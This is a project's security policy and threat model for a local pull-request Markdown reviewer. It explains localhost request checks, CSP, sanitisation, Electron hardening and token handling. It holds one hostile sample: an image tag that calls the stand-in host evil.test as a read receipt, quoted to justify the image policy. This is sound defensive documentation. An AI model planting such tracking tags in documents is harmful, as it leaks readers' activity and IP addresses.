# Security

## Reporting

Please report vulnerabilities privately via [GitHub Security
Advisories](https://github.com/bastiankoerber/marky-mcmarkface/security/advisories/new) rather than a public
issue. Expect an acknowledgement within a few days.

## Threat model

Marky McMarkface runs a local HTTP server that holds a GitHub token with `repo` scope. That makes it a
more interesting target than most localhost tools, and the design reflects it.

**The server is reachable by any page the user has open.** Three checks close the realistic
attacks, in `packages/server/src/middleware/security.ts`:

| Check | Stops |
|---|---|
| `Host` header must be localhost | DNS rebinding, where an attacker domain resolves to 127.0.0.1 |
| `Origin` must be a known origin | ordinary cross-origin reads |
| `X-Marky-McMarkface` must carry this launch's key | CSRF — a `<form>` cannot set custom headers, and a cross-origin `fetch` that tries earns a preflight we fail |

The header value is a random per-launch key, not a constant. Be clear about the limit: the browser
must receive the key in production, and the development proxy supplies it automatically. A local
process that can reach Marky McMarkface's loopback ports can therefore imitate the browser regardless of
which OS user started it. The key stops drive-by web requests; it is not a local-process security
boundary and not a defence against code already running on the machine.

Production and Vite development responses carry `Content-Security-Policy` with
`frame-ancestors 'none'` (so the UI, including its token field, cannot be embedded in another
page) and an `img-src` that permits only local, data, and GitHub-hosted images. That second one is
not cosmetic: an `<img src="https://evil.test/b.png?doc=x">` in a Markdown file is a read receipt
telling its author that a private document was opened, from your IP, at that moment, with no
script involved.

Repository-relative Markdown images are fetched by the local server at the pull request's exact
head SHA. If GitHub reports the path missing there, the server retries the pull request's exact
base SHA. An image element cannot send the API's custom header, so the PR response includes a
random, in-memory capability limited to that repository and those two immutable commits. It
expires after twelve hours, is cleared when credentials change, and grants no access to the
GitHub token or other API routes. The server rejects paths outside the repository, files over 10
MB, and bytes that do not match a supported image signature. SVG responses receive their own
sandboxed `default-src 'none'` policy so embedded resources cannot create a second network channel.

The server binds `127.0.0.1` only, never `0.0.0.0`.

### Desktop application

The optional Electron distribution runs the same loopback server on a randomly selected port.
Its renderer is sandboxed, has context isolation enabled, has no Node.js integration, and is
denied browser permission requests. Navigation away from the app is blocked; explicitly opened
HTTP(S) links are handed to the system browser. Package-time Electron fuses disable Run-as-Node,
Node command-line/environment injection, and loading application code outside the integrity-
checked ASAR archive.

The desktop GitHub token is encrypted with Electron `safeStorage` and kept under the operating
system's application-data directory. macOS Keychain protects the app-specific encryption key;
the application explains the exact “Marky McMarkface Safe Storage” prompt before requesting
access. It does not use the plaintext fallback of the local web installation. Users may instead
choose session-only access, which remains in server-process memory and disappears when the app
quits.

**The token never reaches the browser.** It is decrypted or held only in the server process and
is attached to outbound GitHub calls there. API responses carry the login, never the credential.
The desktop app does not touch Keychain at startup: an existing encrypted credential is detected
without decrypting it, and the user explicitly chooses when to unlock it.

### Desktop updates

The packaged desktop app makes an unauthenticated request to
`api.github.com/repos/bastiankoerber/marky-mcmarkface/releases/latest` shortly after launch and
every six hours while it remains open. The installed version is compared locally and is not put
in the request URL. No GitHub token, pull-request data, or analytics identifier is sent with this
check.

The app asks before downloading an update and again before restarting. Automatic replacement is
available only to Developer ID-signed builds and only for the exact architecture-specific ZIP
created by the release workflow; `-UNSIGNED` artifacts are deliberately ignored. Squirrel.Mac's
signature requirement provides the final installation boundary. Ad-hoc builds can open the GitHub
release page but cannot replace themselves.

**Pull request content is untrusted.** Markdown permits raw HTML, and Marky McMarkface renders Markdown
from arbitrary pull requests inside a page whose origin can reach a token-holding server. Output
is sanitised with DOMPurify before it reaches the DOM. The sanitiser also removes automatic
network loads except data images, approved GitHub image hosts, and repository images addressed
through the scoped local capability, so privacy does not depend on CSP alone.

**Scopes are the minimum GitHub allows.** `repo` and `read:org`. Classic OAuth has no read-only
private-repo scope, and Marky McMarkface must write review comments, so `repo` is unavoidable rather than
chosen. Users who object can supply a fine-grained token instead.

## OAuth Client ID in the repository

Marky McMarkface ships its GitHub OAuth Client ID in source so every installation can use device
flow without asking each user to register an application. A Client ID identifies the OAuth app;
it does not authenticate the app or grant access to a GitHub account. No client secret is bundled.

This is deliberate and follows GitHub's documented guidance for public clients:

> If your app is a public client (a native app that runs on the user's device, CLI utility, or
> single-page web application), you cannot secure your client secret. You will have to ship the
> client secret in the application's code.

The GitHub CLI and VS Code both do the same in their own source. Note the consequence GitHub
also names: a public client id is trivially reusable, so it can be abused as a device-code
phishing primitive against *other* people. That is why the one-click flow (authorization code +
PKCE, which binds a redirect URI) is preferred over device flow where a browser is available.

Marky McMarkface never reuses another product's client id.

## The pull request author is a threat, not just the network

Marky McMarkface renders content written by the person being reviewed, and a review comment is a statement
of record. Two attacks follow from that, and both are defended:

- **Forged anchors.** `data-` attributes survive sanitisation, so a pull request could ship its
  own `data-marky-mcmarkface-pos` and steer where your comment landed — you highlight one sentence, the
  comment posted to GitHub quotes another. The position attribute is namespaced with a
  per-render nonce the document cannot predict. `integrity.test.ts` covers both directions.
- **Hidden or overlaid content.** The `style` and `class` attributes are stripped, so a file
  cannot hide text from the rendered view you approve from, nor paint over the interface —
  including the Approve button.

## Unsent comments are stored on disk

Comments you write before submitting are held in `localStorage` so a reload does not throw them
away. That means the text of a draft comment — prose about a pull request that may be private —
sits unencrypted in the browser profile until you submit it or sign out.

Two consequences worth knowing:

- Any code running on the `localhost` origin can read it. That is the same exposure as every
  other dev server on the machine, and the reason Marky McMarkface's own API requires a per-launch secret.
- Signing out clears every stored draft, deliberately. Removing the token while leaving the
  readable half of the data behind would be a false reassurance.

Nothing else is persisted in the browser. The GitHub token never reaches it.

## Browser extensions

Any extension with content-script access to `localhost` can read what you type into the app and
drive the API. This is a property of shipping a local web UI that holds a `repo` token, not a bug
that can be patched in-page. The CSP does not constrain extensions.

The packaged desktop renderer does not load ordinary browser extensions, so this paragraph
applies only to the local web installation.

## Contributor note

The anchoring spike caches fetched repository content under `.cache/corpus/`. It is gitignored,
but it is real repository content sitting in your working tree.

## What is not protected

- Anyone with access to your unlocked user account on this machine can use Marky McMarkface, exactly as
  they could use `gh`.
- Any local process that can reach Marky McMarkface's loopback ports can imitate the browser. Marky McMarkface's
  HTTP controls defend against hostile web pages, not other software running on the machine.
- A malicious npm dependency runs with your privileges. Viewers are not sandboxed; the default
  set is kept in-repo and reviewed for that reason.
